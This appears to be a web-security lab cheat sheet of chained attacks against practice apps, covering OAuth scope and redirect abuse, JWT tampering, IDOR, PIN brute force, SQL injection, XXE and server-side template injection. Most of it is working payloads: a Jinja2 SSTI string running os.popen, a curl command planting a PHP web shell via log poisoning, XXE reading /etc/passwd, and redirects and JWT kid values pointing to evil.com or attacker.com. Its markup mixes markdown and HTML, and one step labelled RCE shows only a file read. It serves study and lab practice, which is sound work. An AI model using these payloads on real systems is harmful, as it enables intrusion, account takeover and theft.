1. Exploit broken JWT validation (signature bypass, algorithm confusion)
2. Gain elevated privileges or access restricted functionality
3. Find template injection point
4. Exploit SSTI for RCE

**SSTI Detection:**
```
{{7*7}} ‚Üí 49
${7*7} ‚Üí 49
&lt;%= 7*7 %&gt; ‚Üí 49
</code></pre>

<p><strong>SSTI to RCE (Jinja2):</strong></p>

<pre><code>{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

---

### Chain 5: OAuth Misconfiguration ‚Üí XXE ‚Üí RCE

**Attack Flow:**
```
OAuth Scope Upgrade ‚Üí Admin Access ‚Üí XXE Injection ‚Üí Access Config.txt ‚Üí Machine Keys ‚Üí Insecure Deserialization ‚Üí RCE
```

**Steps:**
1. Manipulate OAuth scope (`scope=read` ‚Üí `scope=admin`)
2. Gain admin access
3. Exploit XXE in admin functionality to read config files
4. Extract machine keys/secrets from config
5. Use keys for insecure deserialization attack
6. Achieve RCE

**OAuth Scope Manipulation:**
```
/authorize_callback?authorization_code=xxx&amp;scope=read
                                              ‚Üì
/authorize_callback?authorization_code=xxx&amp;scope=admin
</code></pre>

<hr />

<h2>Chained Attack Patterns Summary</h2>

<table>
<thead>
<tr>
  <th>Chain</th>
  <th>Entry Point</th>
  <th>Pivot</th>
  <th>Final Impact</th>
</tr>
</thead>
<tbody>
<tr>
  <td>LFI ‚Üí Log Poisoning ‚Üí RCE</td>
  <td>File Inclusion</td>
  <td>Log Files</td>
  <td>Code Execution</td>
</tr>
<tr>
  <td>SQLi ‚Üí XXE ‚Üí RCE</td>
  <td>Database</td>
  <td>XML Parser</td>
  <td>Code Execution</td>
</tr>
<tr>
  <td>JWT KID ‚Üí SSRF</td>
  <td>Token Header</td>
  <td>Key Fetch</td>
  <td>Internal Access</td>
</tr>
<tr>
  <td>Broken Session ‚Üí SSTI ‚Üí RCE</td>
  <td>Authentication</td>
  <td>Template Engine</td>
  <td>Code Execution</td>
</tr>
<tr>
  <td>OAuth ‚Üí XXE ‚Üí Deser ‚Üí RCE</td>
  <td>Authorization</td>
  <td>Config Leak</td>
  <td>Code Execution</td>
</tr>
</tbody>
</table>

<h1>Lab</h1>

<h2>Brute Force Attack - PIN Reset</h2>

<p><strong>Vulnerable Endpoint:</strong> <code>/reset-password</code></p>

<p><strong>Attack Flow:</strong></p>

<ol>
<li>Register new user / target existing user</li>
<li>Use "Forgot Password" feature</li>
<li>Intercept PIN reset request with Burp Suite</li>
<li>Send to Intruder</li>
<li>Set PIN field as payload position (<code>Add ¬ß</code> button)</li>
<li>Payload type: Numbers (e.g., 100-999 for 3-digit PIN)</li>
<li>Start attack</li>
<li>Identify correct PIN by different response length</li>
</ol>

<h2>Broken Object Level Authorization (BOLA)</h2>

<p><strong>Vulnerable Endpoint:</strong> <code>/api/virtual-cards</code></p>

<p><strong>Attack Flow:</strong></p>

<ol>
<li>Login as User A (Alice) ‚Üí Note JWT token</li>
<li>Login as User B (Bob) ‚Üí Capture requests</li>
<li>Replace Bob's token with Alice's token</li>
<li>Access Alice's resources with Bob's session</li>
</ol>

<h2>IDOR Attacks</h2>

<h3>IDOR - Transaction Info</h3>

<p><strong>Vulnerable Endpoint:</strong> <code>/transactions/&lt;account_number&gt;</code></p>

<p><strong>Attack:</strong></p>

<pre><code>GET /transactions/5458378513  ‚Üí  GET /transactions/&lt;victim_account&gt;
</code></pre>

<p><em>Change account number to access other users' transactions</em></p>

<h3>IDOR - Freeze Card</h3>

<p><strong>Vulnerable Endpoint:</strong> <code>/api/virtual-cards/&lt;card_id&gt;/toggle-freeze</code></p>

<p><strong>Attack:</strong></p>

<pre><code>POST /api/virtual-cards/9/toggle-freeze  ‚Üí  /api/virtual-cards/&lt;victim_card_id&gt;/toggle-freeze
</code></pre>

<p><em>Change virtual card ID to freeze any user's card</em></p>

<h2>OAuth Attacks</h2>

<h3>Redirect URL Manipulation</h3>

<p><strong>Vulnerable Endpoint:</strong> <code>/authorize</code></p>

<p><strong>Attack Flow:</strong></p>

<ol>
<li>Login and intercept request before clicking "Agree"</li>
<li>Forward until <code>/authorize</code> endpoint</li>
<li>Change <code>redirect_url</code> parameter to attacker-controlled domain (e.g., <code>evil.com</code>)</li>
<li>Authorization code sent to attacker's server</li>
</ol>

<p><strong>Payload:</strong></p>

<pre><code>redirect_url=https://evil.com
</code></pre>

<h3>Scope Upgrade</h3>

<p><strong>Vulnerable Endpoint:</strong> <code>/authorize_callback</code></p>

<p><strong>Attack:</strong></p>

<pre><code>/authorize_callback?authorization_code=xxx&amp;client_id_param=client_3424&amp;scope=read

/authorize_callback?authorization_code=xxx&amp;client_id_param=client_3424&amp;scope=admin
</code></pre>

<p><em>Change <code>scope=read</code> to <code>scope=admin</code> to gain admin access</em></p>

<h2>JWT Attacks</h2>

<h3>Signature Bypass / Privilege Escalation</h3>

<p><strong>Vulnerability:</strong> Application accepts JWT without validating signature</p>

<p><strong>Attack Flow:</strong></p>

<ol>
<li>Login as normal user</li>
<li>Capture request with JWT token</li>
<li>Decode JWT at jwt.io</li>
<li>Modify payload: <code>"is_admin": false</code> ‚Üí <code>"is_admin": true</code></li>
<li>Replace original token with modified token (can omit signature)</li>
<li>Refresh page ‚Üí Admin access granted</li>
</ol>

<p><strong>JWT Modification:</strong></p>

<pre><code>// Original
{"user_id":33,"username":"user","is_admin":false}

// Modified
{"user_id":33,"username":"user","is_admin":true}
</code></pre>

<hr />

<h2>Chain 1: LFI ‚Üí Log Poisoning ‚Üí RCE (Lab)</h2>

<p><strong>Vulnerable Endpoint:</strong> <code>/blog_page/index.php?search=</code></p>

<h3>Step 1: Confirm LFI</h3>

<pre><code>http://&lt;IP&gt;:PORT/blog_page/index.php?search=..%2F..%2F..%2F..%2Fetc%2Fpasswd
</code></pre>

<h3>Step 2: Poison Logs via User-Agent</h3>

<p>bash</p>

<pre><code># Linux
curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://&lt;IP&gt;:PORT/

# PowerShell
curl.exe -H "User-Agent: &lt;?php system(`$_GET['cmd']); ?&gt;" http://&lt;IP&gt;:PORT
```

### Step 3: Access Poisoned Log
```
http://&lt;IP&gt;:PORT/blog_page/index.php?search=logs%2Faccess.log
```

### Step 4: Execute Commands
```
http://&lt;IP&gt;:PORT/blog_page/index.php?search=logs%2Faccess.log&amp;cmd=id
```

**Result:** RCE achieved

---

## Chain 2: SQLi ‚Üí XXE ‚Üí Local File Read (Lab)

### Step 1: SQLi Authentication Bypass
```
Username: Admin' --
Password: anything
</code></pre>

<p><em>Grants admin access</em></p>

<h3>Step 2: XXE in Add Product (XML input)</h3>

<p><strong>Test Payload:</strong></p>

<pre><code>&lt;!--?xml version="1.0" ?--&gt;
&lt;!DOCTYPE replace [&lt;!ENTITY example "Doe"&gt; ]&gt;
&lt;userInfo&gt;
  &lt;firstName&gt;John&lt;/firstName&gt;
  &lt;lastName&gt;&amp;example;&lt;/lastName&gt;
&lt;/userInfo&gt;
</code></pre>

<h3>Step 3: File Read Payload</h3>

<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;product&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
  &lt;description&gt;Test&lt;/description&gt;
&lt;/product&gt;
</code></pre>

<h3>Step 4: Extract via SQLi</h3>

<pre><code>' UNION SELECT product, name FROM items WHERE id=1 --
</code></pre>

<p><em>Increment <code>id</code> to find uploaded product with XXE output</em></p>

<p><strong>Result:</strong> Local file read achieved</p>

<hr />

<h2>Chain 3: JWT KID Header Injection ‚Üí SSRF (Lab)</h2>

<h3>Step 1: Capture JWT Token</h3>

<p>Login and intercept requests in Burp Suite</p>

<h3>Step 2: Decode JWT (jwt.io)</h3>

<p>Identify <code>kid</code> parameter in header:</p>

<p>json</p>

<pre><code>{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-id-value"
}
</code></pre>

<h3>Step 3: SSRF via KID Parameter</h3>

<p>Replace <code>kid</code> with webhook/attacker URL:</p>

<p>json</p>

<pre><code>{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "https://webhook.site/xxxxx"
}
</code></pre>

<h3>Step 4: Send Modified Token</h3>

<p>Replace JWT in request ‚Üí Response: "Request Completed with unknown kid"</p>

<p><strong>Webhook receives GET request ‚Üí SSRF confirmed</strong></p>

<hr />

<h2>Chain 4: Broken Session (JWT) ‚Üí SSTI ‚Üí RCE (Lab)</h2>

<p><strong>Credentials:</strong> <code>user:password</code></p>

<h3>Step 1: Capture &amp; Decode JWT</h3>

<p>json</p>

<pre><code>{
  "user": "user",
  "role": "user"
}
</code></pre>

<h3>Step 2: Modify Role</h3>

<p>json</p>

<pre><code>{
  "user": "user",
  "role": "admin"
}
```

### Step 3: Replace Token
DevTools ‚Üí Storage ‚Üí Cookies ‚Üí Replace JWT value

### Step 4: Access Admin Panel
Refresh page ‚Üí Admin access granted ‚Üí Find "Custom Statement Render"

### Step 5: SSTI Detection
```
{{7*7}}
</code></pre>

<p><em>Output: 49 ‚Üí SSTI confirmed</em></p>

<h3>Step 6: SSTI to File Read (Jinja2)</h3>

<p>python</p>

<pre><code>{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
</code></pre>

<p><strong>Result:</strong> RCE achieved</p>

<hr />

<h2>Quick Reference - Chained Attack Payloads</h2>

<table>
<thead>
<tr>
  <th>Chain</th>
  <th>Key Payloads</th>
</tr>
</thead>
<tbody>
<tr>
  <td>LFI ‚Üí Log Poison ‚Üí RCE</td>
  <td><code>curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;"</code> then <code>?search=logs/access.log&amp;cmd=id</code></td>
</tr>
<tr>
  <td>SQLi ‚Üí XXE ‚Üí File Read</td>
  <td><code>Admin' --</code> then <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> then <code>' UNION SELECT product, name FROM items WHERE id=1 --</code></td>
</tr>
<tr>
  <td>JWT KID ‚Üí SSRF</td>
  <td>Modify <code>kid</code> header to <code>http://attacker.com</code></td>
</tr>
<tr>
  <td>JWT Role ‚Üí SSTI ‚Üí RCE</td>
  <td><code>"role":"admin"</code> then <code>{{7*7}}</code> then <code>{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}</code></td>
</tr>
</tbody>
</table>

    </article>
</body>
</html>